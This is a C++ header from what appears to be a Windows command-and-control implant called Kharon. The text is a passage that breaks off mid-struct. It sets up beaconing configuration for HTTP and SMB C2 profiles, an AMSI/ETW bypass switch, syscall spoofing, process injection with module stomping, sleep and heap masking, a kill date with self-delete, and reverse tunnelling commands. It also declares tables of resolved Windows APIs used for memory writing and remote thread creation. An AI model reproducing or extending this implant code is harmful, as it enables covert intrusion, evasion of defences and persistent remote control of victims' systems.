#ifndef KHARON_H
#define KHARON_H

#include <windows.h>
#include <winnt.h>
#include <ntstatus.h>
#include <guiddef.h>
#include <winsock.h>
#include <iphlpapi.h>
#include <ktmw32.h>
#include <stdio.h>
#include <aclapi.h>
#include <ws2tcpip.h>

namespace mscorlib {
    #include <Mscoree.hh>
}

typedef mscorlib::_PropertyInfo IPropertyInfo;
typedef mscorlib::_AppDomain    IAppDomain;
typedef mscorlib::_Assembly     IAssembly;
typedef mscorlib::_Type         IType;
typedef mscorlib::_MethodInfo   IMethodInfo;
typedef mscorlib::BindingFlags  IBindingFlags;

#include <Clr.h>

#ifdef   WEB_WINHTTP
#include <winhttp.h>
#else
#include <wininet.h>
#endif

#include <KhError.h>
#include <Win32.h>
#include <Defines.h>
#include <Evasion.h>
#include <Misc.h>
#include <Communication.h>

EXTERN_C UPTR StartPtr();
EXTERN_C UPTR EndPtr();

/* ========= [ Config ] ========= */

#define PROFILE_SMB 0x15
#define PROFILE_WEB 0x25

#define INJECTION_STANDARD 0x10
#define INJECTION_STOMPING 0x20

#define KH_JOB_TERMINATE  0x010
#define KH_JOB_READY_SEND 0x050
#define KH_JOB_SUSPENDED  0x100
#define KH_JOB_HIBERN     0x150
#define KH_JOB_RUNNING    0x200
#define KH_JOB_PRE_START  0x300

#ifndef KH_GUARDRAILS_USER
#define KH_GUARDRAILS_USER nullptr
#endif // KH_GUARDRAILS_USER

#ifndef KH_GUARDRAILS_HOST
#define KH_GUARDRAILS_HOST nullptr
#endif // KH_GUARDRAILS_HOST

#ifndef KH_GUARDRAILS_IPADDRESS 
#define KH_GUARDRAILS_IPADDRESS nullptr
#endif // KH_GUARDRAILS_IPADDRESS

#ifndef KH_GUARDRAILS_DOMAIN
#define KH_GUARDRAILS_DOMAIN nullptr
#endif // KH_GUARDRAILS_DOMAIN

#ifndef KH_WORKTIME_ENABLED
#define KH_WORKTIME_ENABLED 0
#endif // KH_WORKTIME_ENABLED

#ifndef KH_WORKTIME_START_HOUR
#define KH_WORKTIME_START_HOUR 0
#endif // KH_WORKTIME_HOUR

#ifndef KH_WORKTIME_START_MIN
#define KH_WORKTIME_START_MIN 0
#endif // KH_WORKTIME_MIN

#ifndef KH_WORKTIME_END_HOUR
#define KH_WORKTIME_END_HOUR 0
#endif // KH_WORKTIME_END_HOUR

#ifndef KH_WORKTIME_END_MIN
#define KH_WORKTIME_END_MIN 0
#endif // KH_WORKTIME_END_MIN

#ifndef KH_KILLDATE_DAY
#define KH_KILLDATE_DAY 0
#endif // KH_KILLDATE_DAY

#ifndef KH_KILLDATE_MONTH
#define KH_KILLDATE_MONTH 0
#endif // KH_KILLDATE_MONTH

#ifndef KH_KILLDATE_YEAR
#define KH_KILLDATE_YEAR 0
#endif // KH_KILLDATE_YEAR

#define KH_CHUNK_SIZE 512000 // 512 KB

#define KH_METHOD_INLINE 0x15
#define KH_METHOD_FORK   0x20

#define KH_INJECT_EXPLICIT 0x100
#define KH_INJECT_SPAWN    0x200

#ifndef KH_AGENT_UUID
#define KH_AGENT_UUID "f47ac10b-58cc-4372-a567-0e02b2c3d479"
#endif // KH_AGENT_UUID

#ifndef KH_SLEEP_TIME
#define KH_SLEEP_TIME 3
#endif // KH_SLEEP_TIME

#ifndef KH_JITTER
#define KH_JITTER 0
#endif // KH_JITTER

#ifndef KH_AMSI_ETW_BYPASS
#define KH_AMSI_ETW_BYPASS 0
#endif // KH_AMSI_ETW_BYPASS

#ifndef KH_BOF_HOOK_ENALED
#define KH_BOF_HOOK_ENALED FALSE
#endif // KH_BOF_HOOK_ENALED

#ifndef KH_KILLDATE_ENABLED
#define KH_KILLDATE_ENABLED FALSE
#endif // KH_KILLDATE_ENABLED

#ifndef KH_PROXY_CALL
#define KH_PROXY_CALL FALSE
#endif // KH_PROXY_CALL

#ifndef PROFILE_C2
#define PROFILE_C2 PROFILE_WEB
#endif 

#ifndef KH_STOMP_MODULE
#define KH_STOMP_MODULE L"chakra.dll"
#endif 

#ifndef KH_INJECTION_ID
#define KH_INJECTION_ID INJECTION_STANDARD
#endif

#ifndef KH_SPAWNTO_X64
#define KH_SPAWNTO_X64 L"C:\\Windows\\System32\\notepad.exe"
#endif // KH_SPAWNTO_X64

#ifndef KH_FORK_PIPE_NAME
#define KH_FORK_PIPE_NAME "\\\\.\\pipe\\kharon_pipe"
#endif // KH_FORK_PIPE_NAME

#ifndef KH_CRYPT_KEY
#define KH_CRYPT_KEY { 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50 }
#endif

#ifndef KH_HEAP_MASK
#define KH_HEAP_MASK FALSE
#endif // KH_HEAP_MASK

#ifndef KH_SYSCALL
#define KH_SYSCALL 0
#endif // KH_SYSCALL

#ifndef KH_CHUNKSIZE
#define KH_CHUNKSIZE 0x500000 //5Mb
#endif // KH_CHUNKSIZE


#ifndef KH_SLEEP_MASK
#define KH_SLEEP_MASK eMask::Timer
#endif // KH_SLEEP_MASK

#ifndef SMB_PIPE_NAME
#define SMB_PIPE_NAME ""
#endif // SMB_PIPE_NAME

#ifndef WEB_METHOD
#define WEB_METHOD L"POST"
#endif // WEB_METHOD

#ifndef WEB_HOST
#define WEB_HOST { L"127.0.0.1" }
#endif // WEB_HOST

#ifndef WEB_HOST_QTT
#define WEB_HOST_QTT 1
#endif // WEB_HOST_QTT

#ifndef WEB_PORT
#define WEB_PORT { 80 }
#endif // WEB_PORT

#ifndef WEB_PORT_QTT
#define WEB_PORT_QTT 1
#endif // WEB_PORT_QTT

#ifndef WEB_ENDPOINT
#define WEB_ENDPOINT { L"/data" }
#endif // WEB_ENDPOINT

#ifndef WEB_ENDPOINT_QTT
#define WEB_ENDPOINT_QTT 1
#endif // WEB_ENDPOINT_QTT

#ifndef WEB_USER_AGENT
#define WEB_USER_AGENT L"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
#endif // WEB_USER_AGENT

#ifndef WEB_HTTP_HEADERS
#define WEB_HTTP_HEADERS L""
#endif // WEB_HTTP_HEADERS

#ifndef WEB_SECURE_ENABLED
#define WEB_SECURE_ENABLED FALSE
#endif // WEB_SECURE_ENABLED

#ifndef WEB_HTTP_COOKIES_QTT
#define WEB_HTTP_COOKIES_QTT 0
#endif // WEB_HTTP_COOKIES_QTT

#ifndef WEB_HTTP_COOKIES
#define WEB_HTTP_COOKIES {}
#endif // WEB_HTTP_COOKIES

#ifndef WEB_PROXY_ENABLED
#define WEB_PROXY_ENABLED FALSE
#endif // WEB_PROXY_ENABLED

#ifndef WEB_PROXY_URL
#define WEB_PROXY_URL L""
#endif // WEB_PROXY_URL

#ifndef WEB_PROXY_USERNAME
#define WEB_PROXY_USERNAME L""
#endif // WEB_PROXY_USERNAME

#ifndef WEB_PROXY_PASSWORD
#define WEB_PROXY_PASSWORD L""
#endif // WEB_PROXY_PASSWORD

#define COMMAND_TUNNEL_START_TCP 62
#define COMMAND_TUNNEL_START_UDP 63
#define COMMAND_TUNNEL_WRITE_TCP 64
#define COMMAND_TUNNEL_WRITE_UDP 65
#define COMMAND_TUNNEL_CLOSE     66
#define COMMAND_TUNNEL_REVERSE   67
#define COMMAND_TUNNEL_ACCEPT    68

#define TUNNEL_STATE_CLOSE   1
#define TUNNEL_STATE_READY   2
#define TUNNEL_STATE_CONNECT 3

#define TUNNEL_MODE_SEND_TCP 0
#define TUNNEL_MODE_SEND_UDP 1
#define TUNNEL_MODE_REVERSE_TCP 2

class Crypt;
class Pivot;
class Coff;
class Beacon;
class Spoof;
class Syscall;
class Jobs;
class Useful;
class Memory;
class Mask;
class Package;
class Parser;
class Task;
class Thread;
class Process;
class Heap;
class Injection;
class Library;
class Transport;
class Token;
class Socket;

#define x64_OPCODE_RET			0xC3
#define x64_OPCODE_MOV			0xB8
#define	x64_SYSCALL_STUB_SIZE   0x20

#define SYSCALL_NONE            0
#define SYSCALL_SPOOF           1
#define SYSCALL_SPOOF_INDIRECT  2

#define KHARON_HEAP_MAGIC 0x545152545889

#define G_KHARON Root::Kharon* Self = []() -> Root::Kharon* { \
    PEB* peb = NtCurrentPeb(); \
    for (ULONG i = 0; i < peb->NumberOfHeaps; i++) { \
        Root::Kharon* potentialKharon = reinterpret_cast<Root::Kharon*>(peb->ProcessHeaps[i]); \
        if (potentialKharon && potentialKharon->MagicValue == KHARON_HEAP_MAGIC) { \
            return potentialKharon; \
        } \
    } \
    return nullptr; \
}();

typedef struct {
    CHAR* AgentId;
    ULONG SleepTime;
    ULONG Jitter;
    BYTE  EncryptKey[16];
    ULONG BofProxy;
    BOOL  Syscall;
    ULONG AmsiEtwBypass;
    ULONG ChunkSize;

    struct {
        ULONG  TechniqueId;
        WCHAR* StompModule;
        ULONG  Allocation;
        ULONG  Writing;
    } Injection;

    struct {
        WCHAR* Spawnto;
        CHAR*  ForkPipe;
    } Postex;

    struct {
        CHAR* UserName;
        CHAR* DomainName;
        CHAR* IpAddress;
        CHAR* HostName;
    } Guardrails;

    struct {
        UINT8 Beacon;
        BOOL  Heap;
    } Mask;

    struct {
        BOOL Enabled;

        INT16 StartHour;
        INT16 StartMin;

        INT16 EndHour;
        INT16 EndMin;
    } Worktime;

    struct {
        BOOL Enabled;
        BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
        BOOL ExitProc;   // if true, exit the process, else exit the thread

        INT16 Day;
        INT16 Month;
        INT16 Year;
    } KillDate;

    struct {
        struct {
            // PBYTE 
        } Malleable;

        WCHAR** Host;
        ULONG*  Port;
        WCHAR** EndPoint;
        ULONG   HostQtt;
        ULONG   PortQtt;
        ULONG   EndpointQtt;
        WCHAR*  UserAgent;
        WCHAR*  HttpHeaders;
        WCHAR*  Method;
        // WCHAR* Cookies[WEB_HTTP_COOKIES_QTT];
        WCHAR*  ProxyUrl;
        WCHAR*  ProxyUsername;
        WCHAR*  ProxyPassword;
        BOOL    ProxyEnabled;
        BOOL    Secure;
    } Web;
} KHARON_CONFIG;

auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID;

typedef struct JOBS {
    PACKAGE* Pkg;
    PARSER*  Psr;
    ULONG    State;
    ULONG    ExitCode;
    PCHAR    UUID;
    ULONG    CmdID;
    BOOL     Clean;
    BOOL     PersistTriggered;

    PARSER* Destroy;

    struct JOBS* Next;  
} JOBS;

namespace Root {

    class Kharon {    
    public:
        Crypt*     Crp; 
        Pivot*     Pvt;
        Beacon*    Bc;
        Coff*      Cf;
        Spoof*     Spf;
        Syscall*   Sys;
        Socket*    Skt;
        Jobs*      Jbs;
        Useful*    Usf;
        Library*   Lib;
        Token*     Tkn;
        Task*      Tsk;
        Injection* Inj;
        Heap*      Hp;
        Process*   Ps;
        Thread*    Td;
        Memory*    Mm;
        Transport* Tsp;
        Mask*      Mk;
        Parser*    Psr;
        Package*   Pkg;
    
        UINT64 MagicValue = KHARON_HEAP_MAGIC;

        struct {
            ULONG SleepTime;
            ULONG Jitter;
            ULONG Profile;

            BOOL  BofHook;
            BOOL  Syscall;
            ULONG AmsiEtwBypass;
            ULONG ChunkSize;

            struct {
                ULONG  TechniqueId;
                WCHAR* StompModule;
                ULONG  Allocation;
                ULONG  Writing;
            } Injection;

            struct {
                UPTR  NtContinueGadget;
                UPTR  JmpGadget;
                UINT8 TechniqueID;
                BOOL  Heap;
            } Mask;

            struct {
                ULONG  ParentID;
                WCHAR* SpoofArg;
                BOOL   BlockDlls;
                WCHAR* CurrentDir;
                BOOL   Pipe;
            } Ps;

            struct {
                WCHAR* Spawnto;
                CHAR*  ForkPipe;
            } Postex;

            struct {
                CHAR* UserName;
                CHAR* DomainName;
                CHAR* IpAddress;
                CHAR* HostName;
            } Guardrails;

            struct {
                BOOL Enabled;

                INT16 StartHour;
                INT16 StartMin;

                INT16 EndHour;
                INT16 EndMin;
            } Worktime;

            struct {
                BOOL Enabled;
                BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
                BOOL ExitProc;   // if true, exit the process, else exit the thread

                INT16 Day;
                INT16 Month;
                INT16 Year;
            } KillDate;

            struct {
                WCHAR** Host;
                ULONG*  Port;
                WCHAR** EndPoint;
                ULONG   HostQtt;
                ULONG   PortQtt;
                ULONG   EndpointQtt;
                WCHAR*  UserAgent;
                WCHAR*  HttpHeaders;
                WCHAR*  Method;
                // WCHAR* Cookies[WEB_HTTP_COOKIES_QTT];
                WCHAR*  ProxyUrl;
                WCHAR*  ProxyUsername;
                WCHAR*  ProxyPassword;
                BOOL    ProxyEnabled;
                BOOL    Secure;
            } Web = {
                .HostQtt = 0,
                .PortQtt = 0,
                .EndpointQtt = 0,
            };
        } Config {
            .Ps = {
                .ParentID   = 0,
                .BlockDlls  = FALSE,
                .CurrentDir = nullptr,
                .Pipe       = TRUE,
            },
        };

        struct {
            ULONG AllocGran;
            ULONG PageSize;
            PCHAR CompName;
            PCHAR UserName;
            PCHAR DomName;
            PCHAR NetBios;
            ULONG IpAddress;
            PCHAR ProcessorName;
            ULONG ProcessorsNbr;
            ULONG AvalRAM;
            ULONG UsedRAM;
            ULONG TotalRAM;
            ULONG PercentRAM;
            BOOL  CfgEnabled;
            BYTE  OsArch;
            ULONG OsMjrV;
            ULONG OsMnrV;
            ULONG ProductType;
            ULONG OsBuild;
        } Machine = {
            .DomName= "-"
        };

        struct {
            PCHAR AgentID;
            UPTR  HeapHandle;
            ULONG ProcessID;
            ULONG ParentID;
            ULONG ThreadID;
            ULONG ProcessArch;
            PCHAR CommandLine;
            PCHAR ImagePath;
            BOOL  Elevated;
            BOOL  Connected;

            struct {
                UPTR Start;
                UPTR Length;
            } Base;        
        } Session = {
            .HeapHandle = U_PTR( NtCurrentPeb()->ProcessHeap ),
            .Connected  = FALSE,
        };

        struct {
            UPTR Handle;

            DECLAPI( getsockopt );
            DECLAPI( gethostbyname );
            DECLAPI( WSAGetLastError );
            DECLAPI( inet_ntoa );
            DECLAPI( WSAStartup );
            DECLAPI( WSASocketA );
            DECLAPI( WSACleanup );
            DECLAPI( __WSAFDIsSet );
            DECLAPI( shutdown );
            DECLAPI( closesocket );
            DECLAPI( getaddrinfo );
            DECLAPI( ntohs );
            DECLAPI( select );
            DECLAPI( send );
            DECLAPI( bind );
            DECLAPI( listen );
            DECLAPI( setsockopt );
            DECLAPI( connect );
            DECLAPI( inet_addr );
            DECLAPI( htons );
            DECLAPI( socket );
            DECLAPI( accept );
            DECLAPI( recv );
            DECLAPI( ioctlsocket );
            DECLAPI( freeaddrinfo );
        } Ws2_32 = {
            RSL_TYPE( getsockopt ),
            RSL_TYPE( gethostbyname ),
            RSL_TYPE( WSAGetLastError ),
            RSL_TYPE( inet_ntoa ),
            RSL_TYPE( WSAStartup ),
            RSL_TYPE( WSASocketA ),
            RSL_TYPE( WSACleanup ),
            RSL_TYPE( __WSAFDIsSet ),
            RSL_TYPE( shutdown ),
            RSL_TYPE( closesocket ),
            RSL_TYPE( getaddrinfo ),
            RSL_TYPE( ntohs ),
            RSL_TYPE( select ),
            RSL_TYPE( send ),
            RSL_TYPE( bind ),
            RSL_TYPE( listen ),
            RSL_TYPE( setsockopt ),
            RSL_TYPE( connect ),
            RSL_TYPE( inet_addr ),
            RSL_TYPE( htons ),
            RSL_TYPE( socket ),
            RSL_TYPE( accept ),
            RSL_TYPE( recv ),
            RSL_TYPE( ioctlsocket ),
            RSL_TYPE( freeaddrinfo )
        };

        struct {
            UPTR Handle;
        } KrnlBase;

        struct {
            UPTR Handle;

            DECLAPI( printf );
            DECLAPI( vprintf );
            DECLAPI( vsnprintf );
            DECLAPI( strncpy );
        } Msvcrt = {
            RSL_TYPE( printf ),
            RSL_TYPE( vprintf ),
            RSL_TYPE( vsnprintf ),
            RSL_TYPE( strncpy ),
        };

        struct {
            UPTR Handle;

            DECLAPI( StringCchPrintfW );
    
            DECLAPI( FreeLibrary );
            DECLAPI( LoadLibraryA ); 
            DECLAPI( LoadLibraryW );
            DECLAPI( GetProcAddress );
            DECLAPI( GetModuleHandleA );
            DECLAPI( GetModuleHandleW );
            DECLAPI( EnumProcessModules );
            DECLAPI( K32GetModuleFileNameExA );
            DECLAPI( GetModuleFileNameW );
            DECLAPI( Sleep );

            DECLAPI( GetSystemTime );

            DECLAPI( GetTickCount );

            DECLAPI( CreateTimerQueueTimer );

            DECLAPI( DuplicateHandle );
            DECLAPI( SetHandleInformation );
            DECLAPI( GetStdHandle );
            DECLAPI( SetStdHandle );

            DECLAPI( GetConsoleWindow );
            DECLAPI( AllocConsole );
            DECLAPI( FreeConsole );

            DECLAPI( CreateTransaction );

            DECLAPI( GetACP );
            DECLAPI( GetOEMCP );

            DECLAPI( GetFileSizeEx );
            DECLAPI( CreateFileA );
            DECLAPI( CreateFileW );
            DECLAPI( SetFilePointer );
            DECLAPI( GetFullPathNameA );
            DECLAPI( CreateFileTransactedA );
            DECLAPI( CreatePipe );
            DECLAPI( DisconnectNamedPipe );
            DECLAPI( FlushFileBuffers );
            DECLAPI( GetCurrentDirectoryA );
            DECLAPI( PeekNamedPipe );
            DECLAPI( ConnectNamedPipe );
            DECLAPI( WaitNamedPipeA );
            DECLAPI( GetOverlappedResult );
            DECLAPI( CreateNamedPipeA );
            DECLAPI( CreateDirectoryA );
            DECLAPI( DeleteFileA );
            DECLAPI( CopyFileA );
            DECLAPI( MoveFileA );
            DECLAPI( ReadFile );
            DECLAPI( WriteFile );
            DECLAPI( WriteFileEx );
            DECLAPI( SetCurrentDirectoryA );
            DECLAPI( GetFileSize );
            DECLAPI( FileTimeToSystemTime );
            DECLAPI( FindFirstFileA );
            DECLAPI( FindFirstFileW );
            DECLAPI( FindNextFileA );
            DECLAPI( FindNextFileW );
            DECLAPI( FindClose );
            DECLAPI( SetFileInformationByHandle );
        
            DECLAPI( CreateProcessA );
            DECLAPI( CreateProcessW );
            DECLAPI( GetExitCodeProcess );
            DECLAPI( OpenProcess );
            DECLAPI( IsWow64Process );
        
            DECLAPI( GetComputerNameExA );
        
            DECLAPI( TlsAlloc );
            DECLAPI( TlsSetValue );
            DECLAPI( TlsGetValue );
            DECLAPI( TerminateThread );
            DECLAPI( TerminateProcess );
            DECLAPI( GetExitCodeThread );
            DECLAPI( OpenThread );
            DECLAPI( SuspendThread );
            DECLAPI( ResumeThread );
            DECLAPI( CreateThread );
            DECLAPI( CreateRemoteThread );
            DECLAPI( GetThreadId );

            DECLAPI( BaseThreadInitThunk );
        
            DECLAPI( GlobalMemoryStatusEx );
            DECLAPI( GetNativeSystemInfo );
            DECLAPI( FormatMessageA );
        
            DECLAPI( WaitForSingleObject );
            DECLAPI( WaitForSingleObjectEx );

            DECLAPI( LocalAlloc   );
            DECLAPI( LocalReAlloc );
            DECLAPI( LocalFree    );

            DECLAPI( GetVersionExA );
        
            DECLAPI( SetEvent );
            DECLAPI( CreateEventA );

            DECLAPI( VirtualProtect );
            DECLAPI( VirtualProtectEx );
            DECLAPI( VirtualAlloc );
            DECLAPI( VirtualAllocEx );
            DECLAPI( VirtualQuery );
            DECLAPI( VirtualQueryEx );
            DECLAPI( VirtualFreeEx );
            DECLAPI( VirtualFree );
            DECLAPI( WriteProcessMemory );
            DECLAPI( ReadProcessMemory );

            DECLAPI( AddVectoredExceptionHandler );
            DECLAPI( RemoveVectoredContinueHandler );

            DECLAPI( InitializeCriticalSection );
            DECLAPI( EnterCriticalSection );
            DECLAPI( LeaveCriticalSection );
            DECLAPI( DeleteCriticalSection );

            DECLAPI( InitializeProcThreadAttributeList );
            DECLAPI( UpdateProcThreadAttribute );
            DECLAPI( DeleteProcThreadAttributeList );
        } Krnl32 = {
            RSL_TYPE( StringCchPrintfW ),
            
            RSL_TYPE( FreeLibrary ),
            RSL_TYPE( LoadLibraryA ),
            RSL_TYPE( LoadLibraryW ),
            RSL_TYPE( GetProcAddress ),
            RSL_TYPE( GetModuleHandleA ),
            RSL_TYPE( GetModuleHandleW ),
            RSL_TYPE( EnumProcessModules ),
            RSL_TYPE( K32GetModuleFileNameExA ),
            RSL_TYPE( GetModuleFileNameW ),
            RSL_TYPE( Sleep ),

            RSL_TYPE( GetSystemTime ),

            RSL_TYPE( GetTickCount ),

            RSL_TYPE( CreateTimerQueueTimer ),

            RSL_TYPE( DuplicateHandle ),
            RSL_TYPE( SetHandleInformation ),
            RSL_TYPE( GetStdHandle ),
            RSL_TYPE( SetStdHandle ),

            RSL_TYPE( GetConsoleWindow ),
            RSL_TYPE( AllocConsole ),
            RSL_TYPE( FreeConsole ),
        
            RSL_TYPE( CreateTransaction ),

            RSL_TYPE( GetACP ),
            RSL_TYPE( GetOEMCP ),

            RSL_TYPE( GetFileSizeEx ),
            RSL_TYPE( CreateFileA ),
            RSL_TYPE( CreateFileW ),
            RSL_TYPE( SetFilePointer ),
            RSL_TYPE( GetFullPathNameA ),
            RSL_TYPE( CreateFileTransactedA ),
            RSL_TYPE( CreatePipe ),
            RSL_TYPE( GetCurrentDirectoryA ),
            RSL_TYPE( PeekNamedPipe ),
            RSL_TYPE( ConnectNamedPipe ),
            RSL_TYPE( WaitNamedPipeA ),
            RSL_TYPE( CreateNamedPipeA ),
            RSL_TYPE( CreateDirectoryA ),
            RSL_TYPE( DeleteFileA ),
            RSL_TYPE( CopyFileA ),
            RSL_TYPE( MoveFileA ),
            RSL_TYPE( ReadFile ),
            RSL_TYPE( WriteFile ),
            RSL_TYPE( WriteFileEx ),
            RSL_TYPE( SetCurrentDirectoryA ),
            RSL_TYPE( GetFileSize ),
            RSL_TYPE( FileTimeToSystemTime ),
            RSL_TYPE( FindFirstFileA ),
            RSL_TYPE( FindFirstFileW ),
            RSL_TYPE( FindNextFileA ),
            RSL_TYPE( FindNextFileW ),
            RSL_TYPE( FindClose ),
            RSL_TYPE( SetFileInformationByHandle ),
        
            RSL_TYPE( CreateProcessA ),
            RSL_TYPE( CreateProcessW ),
            RSL_TYPE( OpenProcess ),
            RSL_TYPE( IsWow64Process ),
        
            RSL_TYPE( GetComputerNameExA ),
        
            RSL_TYPE( TlsAlloc ),
            RSL_TYPE( TlsSetValue ),
            RSL_TYPE( TlsGetValue ),
            RSL_TYPE( TerminateThread ),
            RSL_TYPE( TerminateProcess ),
            RSL_TYPE( OpenThread ),
            RSL_TYPE( SuspendThread ),
            RSL_TYPE( ResumeThread ),
            RSL_TYPE( CreateThread ),
            RSL_TYPE( CreateRemoteThread ),
            RSL_TYPE( GetThreadId ),
        
            RSL_TYPE( BaseThreadInitThunk ),

            RSL_TYPE( GlobalMemoryStatusEx ),
            RSL_TYPE( GetNativeSystemInfo ),
            RSL_TYPE( FormatMessageA ),
        
            RSL_TYPE( WaitForSingleObject ),
            RSL_TYPE( WaitForSingleObjectEx ),

            RSL_TYPE( LocalAlloc   ),
            RSL_TYPE( LocalReAlloc ),
            RSL_TYPE( LocalFree    ),

            RSL_TYPE( GetVersionExA ),

            RSL_TYPE( SetEvent ),
        
            RSL_TYPE( VirtualProtect ),
            RSL_TYPE( VirtualProtectEx ),
            RSL_TYPE( VirtualAlloc ),
            RSL_TYPE( VirtualAllocEx ),
            RSL_TYPE( VirtualQuery ),
            RSL_TYPE( VirtualQueryEx ),
            RSL_TYPE( VirtualFreeEx ),
            RSL_TYPE( VirtualFree ),
            RSL_TYPE( WriteProcessMemory ),
            RSL_TYPE( ReadProcessMemory ),

            RSL_TYPE( AddVectoredExceptionHandler ),
            RSL_TYPE( RemoveVectoredContinueHandler ),

            RSL_TYPE( InitializeCriticalSection ),
            RSL_TYPE( EnterCriticalSection ),
            RSL_TYPE( LeaveCriticalSection ),
            RSL_TYPE( DeleteCriticalSection ),

            RSL_TYPE( InitializeProcThreadAttributeList ),
            RSL_TYPE( UpdateProcThreadAttribute ),
            RSL_TYPE( DeleteProcThreadAttributeList )
        };

        struct {
            UPTR Handle;

            DECLAPI( RtlLookupFunctionEntry );
            DECLAPI( RtlIpv4StringToAddressA );

            DECLAPI( RtlNtStatusToDosError );
            DECLAPI( DbgPrint );
            DECLAPI( NtClose );
            DECLAPI( RtlRandomEx );

    
            DECLAPI( NtAllocateVirtualMemory );
            DECLAPI( NtWriteVirtualMemory );
            DECLAPI( NtFreeVirtualMemory );
            DECLAPI( NtProtectVirtualMemory );
            DECLAPI( NtReadVirtualMemory );
            DECLAPI( NtCreateSection );
            DECLAPI( NtMapViewOfSection );

            DECLAPI( khRtlFillMemory );

            DECLAPI( LdrGetProcedureAddress );

            DECLAPI( NtOpenThreadTokenEx );
            DECLAPI( NtOpenProcessTokenEx );
    
            DECLAPI( NtOpenProcess );
            DECLAPI( NtCreateThreadEx ); 
            DECLAPI( NtOpenThread );
            DECLAPI( RtlExitUserThread );
            DECLAPI( RtlExitUserProcess );

            DECLAPI( RtlUserThreadStart );
    
            DECLAPI( RtlCaptureContext );
            DECLAPI( NtGetContextThread );
            DECLAPI( NtSetContextThread );
            DECLAPI( NtCreateEvent ); 
            DECLAPI( NtSetEvent );
            DECLAPI( NtContinue );
    
            DECLAPI( NtWaitForSingleObject );
            DECLAPI( NtSignalAndWaitForSingleObject );
    
            DECLAPI( NtSetInformationVirtualMemory );
    
            DECLAPI( NtQueryInformationToken );
            DECLAPI( NtQueryInformationProcess );
            DECLAPI( NtQuerySystemInformation );

            DECLAPI( NtTestAlert );
            DECLAPI( NtAlertResumeThread );
            DECLAPI( NtQueueApcThread );

            DECLAPI( RtlAllocateHeap   );
            DECLAPI( RtlReAllocateHeap );
            DECLAPI( RtlFreeHeap       );
    
            DECLAPI( RtlQueueWorkItem );

            DECLAPI( TpAllocTimer );
            DECLAPI( TpSetTimer );
            DECLAPI( RtlCreateTimer );
            DECLAPI( RtlDeleteTimer );
            DECLAPI( RtlCreateTimerQueue );
            DECLAPI( RtlDeleteTimerQueue );

            DECLAPI( RtlAddFunctionTable );

            DECLAPI( RtlAddVectoredExceptionHandler );
            DECLAPI( RtlAddVectoredContinueHandler );
            DECLAPI( RtlRemoveVectoredContinueHandler );
            DECLAPI( RtlRemoveVectoredExceptionHandler );

            DECLAPI( RtlInitializeCriticalSection );
            DECLAPI( RtlLeaveCriticalSection );
            DECLAPI( RtlEnterCriticalSection );
            DECLAPI( RtlDeleteCriticalSection );
        } Ntdll = {
            RSL_TYPE( RtlLookupFunctionEntry ),
            RSL_TYPE( RtlIpv4StringToAddressA ),

            RSL_TYPE( RtlNtStatusToDosError ),
            RSL_TYPE( DbgPrint ),
            RSL_TYPE( NtClose ),
            RSL_TYPE( RtlRandomEx ),
    
            RSL_TYPE( NtAllocateVirtualMemory ),
            RSL_TYPE( NtWriteVirtualMemory ),
            RSL_TYPE( NtFreeVirtualMemory ),
            RSL_TYPE( NtProtectVirtualMemory ),
            RSL_TYPE( NtReadVirtualMemory ),
            RSL_TYPE( NtCreateSection ),
            RSL_TYPE( NtMapViewOfSection ),

            RSL_TYPE( khRtlFillMemory ),

            RSL_TYPE( LdrGetProcedureAddress ),
    
            RSL_TYPE( NtOpenThreadTokenEx ),
            RSL_TYPE( NtOpenProcessTokenEx ),

            RSL_TYPE( NtOpenProcess ),
            RSL_TYPE( NtCreateThreadEx ),
            RSL_TYPE( NtOpenThread ),
            RSL_TYPE( RtlExitUserThread ),
            RSL_TYPE( RtlExitUserProcess ),

            RSL_TYPE( RtlUserThreadStart ),
    
            RSL_TYPE( RtlCaptureContext ),
            RSL_TYPE( NtGetContextThread ),
            RSL_TYPE( NtSetContextThread ),
            RSL_TYPE( NtCreateEvent ),
            RSL_TYPE( NtSetEvent ),
            RSL_TYPE( NtContinue ),
    
            RSL_TYPE( NtWaitForSingleObject ),
            RSL_TYPE( NtSignalAndWaitForSingleObject ),
    
            RSL_TYPE( NtSetInformationVirtualMemory ),

            RSL_TYPE( NtQueryInformationToken ),
            RSL_TYPE( NtQueryInformationProcess ),
            RSL_TYPE( NtQuerySystemInformation ),
    
            RSL_TYPE( NtTestAlert ),
            RSL_TYPE( NtAlertResumeThread ),
            RSL_TYPE( NtQueueApcThread ),
    
            RSL_TYPE( RtlAllocateHeap   ),
            RSL_TYPE( RtlReAllocateHeap ),
            RSL_TYPE( RtlFreeHeap       ),

            RSL_TYPE( RtlQueueWorkItem ),

            RSL_TYPE( TpAllocTimer ),
            RSL_TYPE( TpSetTimer ),
            RSL_TYPE( RtlCreateTimer ),
            RSL_TYPE( RtlDeleteTimer ),
            RSL_TYPE( RtlCreateTimerQueue ),
            RSL_TYPE( RtlDeleteTimerQueue ),

            RSL_TYPE( RtlAddFunctionTable ),

            RSL_TYPE( RtlAddVectoredExceptionHandler ),
            RSL_TYPE( RtlAddVectoredContinueHandler ),
            RSL_TYPE( RtlRemoveVectoredContinueHandler ),
            RSL_TYPE( RtlRemoveVectoredExceptionHandler ),

            RSL_TYPE( RtlInitializeCriticalSection ),
            RSL_TYPE( RtlLeaveCriticalSection ),
            RSL_TYPE( RtlEnterCriticalSection ),
            RSL_TYPE( RtlDeleteCriticalSection ),
        };
           
        struct {
            UPTR Handle;

            DECLAPI( CommandLineToArgvW );
        } Shell32 = {
            RSL_TYPE( CommandLineToArgvW ),
        };

        struct {
            UPTR Handle;

            DECLAPI( GetAdaptersInfo );
        } Iphlpapi = {
            RSL_TYPE( GetAdaptersInfo )
        };

        struct {
            UPTR Handle;

	    DECLAPI( wsprintfW );
            DECLAPI( ShowWindow );
        } User32 = {
	    RSL_TYPE( wsprintfW ),
            RSL_TYPE( ShowWindow ),
        };

        struct {
            HANDLE Handle;

            DECLAPI( CoInitialize );
            DECLAPI( CoInitializeEx );
        } Ole32 = {
            RSL_TYPE( CoInitialize ),
            RSL_TYPE( CoInitializeEx ),
        };

        struct {
